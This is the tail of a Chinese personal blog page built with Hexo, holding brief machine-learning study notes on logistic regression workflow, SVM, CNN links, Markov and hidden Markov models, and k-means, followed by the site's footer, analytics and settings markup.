<li>收集数据（需要进行距离计算，数值型，结构化数据最佳）</li>
<li>训练数据：大部分时间进行训练，训练的目的是为了找到最佳的分类回归系数。</li>
<li>测试数据</li>
<li>使用数据：输入数据–》结构化处理–》分类判定–》基于已经训练好的回归系数就可以对于这些数值进行简单的回归计算，判定它们属于哪个分类–》进一步处理</li>
<li>​</li>
</ol>
<h2 id="support-vector-machine-SVM"><a href="#support-vector-machine-SVM" class="headerlink" title="support vector machine (SVM)"></a>support vector machine (SVM)</h2><p>支持向量机，因其英文名为support vector machine，故一般简称SVM，通俗来讲，它是一种<strong>二类分类</strong>模型，其基本模型定义为特征空间上的间隔最大的线性分类器，其学习策略便是间隔最大化，最终可转化为一个凸二次规划问题的求解。</p>
<p>参考：<a href="http://blog.csdn.net/v_july_v/article/details/7624837" target="_blank" rel="noopener">http://blog.csdn.net/v_july_v/article/details/7624837</a></p>
<p><a href="https://www.zhihu.com/question/21094489" target="_blank" rel="noopener">https://www.zhihu.com/question/21094489</a><br><a href="https://zhuanlan.zhihu.com/p/21932911?refer=baina" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/21932911?refer=baina</a></p>
<ul>
<li>SVM通过核函数视图非线性的问题的数据集转变为核空间中一个<strong>线性</strong>可分的数据集。</li>
<li>神经网络是通过多个感知器(Perceptron)的组合叠加来解决<strong>非线性</strong>的分类问题。</li>
</ul>
<h2 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h2><p>CNN(卷积神经网络)<br>CNN：<a href="https://www.zhihu.com/question/52668301" target="_blank" rel="noopener">https://www.zhihu.com/question/52668301</a></p>
<h3 id="一般流程-4"><a href="#一般流程-4" class="headerlink" title="一般流程"></a>一般流程</h3><h1 id="聚类算法"><a href="#聚类算法" class="headerlink" title="聚类算法"></a>聚类算法</h1><p>#</p>
<h2 id="隐马可夫模型-HMM"><a href="#隐马可夫模型-HMM" class="headerlink" title="隐马可夫模型(HMM)"></a>隐马可夫模型(HMM)</h2><h3 id="马可夫模型"><a href="#马可夫模型" class="headerlink" title="马可夫模型"></a>马可夫模型</h3><p>参考：<a href="https://www.zhihu.com/question/20962240" target="_blank" rel="noopener">https://www.zhihu.com/question/20962240</a></p>
<p>马尔可夫模型可以看做是一个转移弧上有概率的非确定的有限状态自动机。<br><a href="http://osuq6jhys.bkt.clouddn.com/1337433786_7958.jpg" target="_blank" rel="noopener"><img src="http://osuq6jhys.bkt.clouddn.com/1337433786_7958.jpg" alt="image"></a>image</p>
<p>在上图中，圆圈表示状态，状态之间的转移用带箭头的弧表示，弧上的数字为状态转移的概率，初始状态用标记为start的输入箭头表示，假设任何状态都可作为终止状态。图中零概率的转移弧省略，且每个节点上所有发出弧的概率之和等于1。</p>
<h3 id="隐马可夫模型-HMM-1"><a href="#隐马可夫模型-HMM-1" class="headerlink" title="隐马可夫模型(HMM)"></a>隐马可夫模型(HMM)</h3><p>每个状态代表了一个可观察的事件，所以，马可夫模型有时又称作视马可夫模型(VMM)，这在某种程度上限制了模型的适应性。而在我们的隐马可夫模型(HMM)中，我们不知道模型所经过的状态序列，只知道状态的概率函数，也就是说，观察到的事件是状态的随机函数，因此改模型是一个双重的随机过程。其中，模型的状态转换是不可观察的，即隐蔽的，可观察事件的随机过程是隐蔽的状态过程的随机函数。</p>
<h2 id="k-均值"><a href="#k-均值" class="headerlink" title="k-均值"></a>k-均值</h2><p>算法过程：Kmeans中文称为k-均值，步骤为：</p>
<p>(1)它事先选定k个聚类中心，<br>(2)然后看每个样本点距离那个聚类中心最近，则该样本就属于该聚类中心。<br>(3)求每个聚类中心的样本的均值来替换该聚类中心(更新聚类中心)。<br>(4)不断迭代(2)和(3), 直到收敛。</p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/机器学习/">机器学习</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
  </nav>

</section>
        
      </div>
      
        <div align="center" style="margin-top: 30px;"><hr class="hr" style="margin:0px; height:3px;"></div>
      
      <footer id="footer">
  

  <div class="container">
      	<div class="row">
	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
	      <p id="copyRightEn">Copyright &copy; 2016 - 2018 shackle All Rights Reserved.</p>
	      
	      
    		<p class="busuanzi_uv">
				访客数 : <span id="busuanzi_value_site_uv"></span> |  
				访问量 : <span id="busuanzi_value_site_pv"></span>
		    </p>
  		   
		</div>

		
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");
    var allheader = document.getElementById("allheader");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    if (allheader != null) {
      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    } else {
      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    }
</script>
    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/scripts.js"></script>


  <script src="/js/home.js"></script>










	<div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1261091520&web_id=1261091520" language="JavaScript"></script>
  </div>



	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
	</script>






  </div>

  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h2 class="modal-title" id="myModalLabel">设置</h2>
      </div>
      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">


      <div class="modal-body">
          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
              正文字号大小
            </a>
          </div>
          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
          <div class="panel-body">
            您已调整页面字体大小
          </div>
        </div>
      


          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
              夜间护眼模式
            </a>
        </div>
          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
          <div class="panel-body">
            夜间模式已经开启，再次单击按钮即可关闭 
          </div>
        </div>

        <div>
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
        </div>
         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
          <div class="panel-body">
            shackle
          </div>
          <div class="panel-body">
            Copyright © 2018 shackle All Rights Reserved.
          </div>
        </div>
      </div>


      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <div class="modal-footer">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
      </div>
    </div>
  </div>
</div>
  
  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
  
</body>
</html>